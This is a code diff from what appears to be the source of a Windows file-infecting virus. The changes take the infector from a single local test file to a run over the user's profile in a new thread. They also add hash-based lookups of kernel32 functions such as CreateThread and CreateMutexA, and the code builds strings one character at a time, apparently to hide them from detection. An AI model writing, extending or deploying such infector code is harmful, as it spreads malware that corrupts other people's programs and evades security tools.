@@ -449,9 +449,8 @@ void WINAPI FindFile(PSTR directory, PDATA data)
 
 void WINAPI InfectUserProfile(PDATA data)
 {
-    InfectFile("E:\\Code\\C++\\1.exe", data);
-    return;
-
+    //InfectFile("E:\\Code\\C++\\1.exe", data);
+    //return;
     char user_profile[1024];
     char user_profile_str[12];
     user_profile_str[0] = 'u'; 
@@ -481,9 +480,8 @@ int main()
     DATA data;
     data.iat = &iat;
     GetFunctionAddress(&data);
-    InfectUserProfile(&data);
-
-    FindFile(NULL, NULL);
+    data.iat->fnCreateThread(NULL, 0, InfectUserProfile, &data, 0, NULL);
+    EmptyFunction();
     return 0;
 }
 
@@ -658,6 +656,18 @@ void GetFunctionAddress(PDATA data)
         if (hash == 0x158bec59)
         {
             data->iat->fnCloseHandle = (pCloseHandle)((PUCHAR)kernel32_base + function_table[ordinal[i]]);
+        }
+
+        // Hash of CreateThread
+        if (hash == 0x4d89b8a)
+        {
+            data->iat->fnCreateThread = (pCreateThread)((PUCHAR)kernel32_base + function_table[ordinal[i]]);
+        }
+
+        // Hash of CreateMutexA
+        if (hash == 0x46d6e46)
+        {
+            data->iat->fnCreateMutexA = (pCreateMutexA)((PUCHAR)kernel32_base + function_table[ordinal[i]]);
         }
 
     }
